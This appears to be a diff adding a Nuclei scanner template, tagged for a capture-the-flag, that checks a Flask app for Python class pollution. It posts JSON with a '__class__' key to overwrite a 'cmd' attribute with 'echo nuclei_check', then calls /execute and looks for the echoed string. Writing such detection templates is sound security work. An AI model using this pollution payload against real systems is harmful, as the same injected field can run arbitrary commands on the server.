@@ -1,0 +1,41 @@
+id: flask-class-pollution-rce
+
+info:
+  name: Flask Class Pollution RCE (Merge Function)
+  author: jebeen
+  severity: critical
+  description: |
+    Detects Python Class Pollution vulnerability in the 'merge' function.
+    Pollutes the Principal class 'cmd' attribute to achieve RCE.
+  tags: ctf, python, pollution, rce
+
+http:
+  - raw:
+      # [Step 1] Pollution Request
+      # Principal 클래스의 cmd 속성을 'echo nuclei_check'로 덮어씁니다.
+      - |
+        POST /add_member HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "name": "nuclei_scanner",
+          "role": "principal",
+          "__class__": {
+            "cmd": "echo nuclei_check"
+          }
+        }
+
+      # [Step 2] Execution Request
+      # 오염된 커맨드를 실행하는 엔드포인트를 호출합니다.
+      - |
+        GET /execute HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      # [검증]
+      # 2번째 요청(GET /execute)의 응답에서 echo 결과인 'nuclei_check'가 나오는지 확인
+      - type: word
+        part: body
+        words:
+          - "nuclei_check"
